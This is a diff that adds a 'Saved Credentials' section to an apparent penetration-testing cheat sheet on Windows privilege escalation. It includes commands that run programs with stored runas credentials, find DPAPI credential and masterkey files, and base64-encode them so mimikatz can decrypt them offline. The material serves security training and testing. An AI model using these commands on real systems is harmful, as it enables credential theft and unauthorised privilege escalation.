@@ -865,9 +865,37 @@ Get-ScheduledTask | select TaskName,State
 
 ### Saved Credentials
 ```powershell
+
+# Windows may store credentials for a number of reasons. One of them is that an sysadmin may have configured an application to run as an administrative user, with the "/savecred" switch specified.
 cmdkey /list
+
+# Typically "runas /savecred" is used to create a shortcut, enumerate all the accessible shortcut (.lnk) files on the system, and examine them for the presence of the "runas" command.
+Get-ChildItem "C:\" *.lnk -Recurse -Force | ft fullname | Out-File shortcuts.txt
+ForEach($file in gc .\shortcuts.txt) { Write-Output $file; gc $file |
+Select-String runas }
+
+# exec with founded user
 runas /user:<domain>\<user> /savecred "COMMAND HERE"
 runas /user:inlanefreight\bob /savecred "whoami"
+
+# extract creds
+# The runas credentials and other stored credentials can be extracted from the Windows Data Protection API. To do so, you need to identify the credential files (32-character strings) and masterkeys (GUIDs), which have the "System" file attribute. Use the DIR /AS command to find them.
+
+cmd /c "dir /S /AS C:\Users\security\AppData\Local\Microsoft\Vault & dir /S /AS
+C:\Users\security\AppData\Local\Microsoft\Credentials & dir /S /AS
+C:\Users\security\AppData\Local\Microsoft\Protect & dir /S /AS
+C:\Users\security\AppData\Roaming\Microsoft\Vault & dir /S /AS
+C:\Users\security\AppData\Roaming\Microsoft\Credentials & dir /S /AS
+C:\Users\security\AppData\Roaming\Microsoft\Protect"
+
+# get the credential and masterkey as base64
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\security\AppData\Roaming\Microsoft\Credentials\51AB168BE4BDB3A603DADE4F8CA81290"))
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001\0792c32e-48a5-4fe3-8b43-d93d64590580"))
+
+# write them and read with mimkatz
+[IO.File]::WriteAllBytes("51AB168BE4BDB3A603DADE4F8CA81290",[Convert]::FromBase64String(""))
+[IO.File]::WriteAllBytes("0792c32e-48a5-4fe3-8b43-d93d64590580",[Convert]::FromBase64String(""))
+
 ```
 - [SessionGopher](https://github.com/Arvanaghi/SessionGopher) searches for and decrypts saved login information for remote access tools like (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
 - We need local admin access to retrieve stored session information. but it is always worth running as normal user
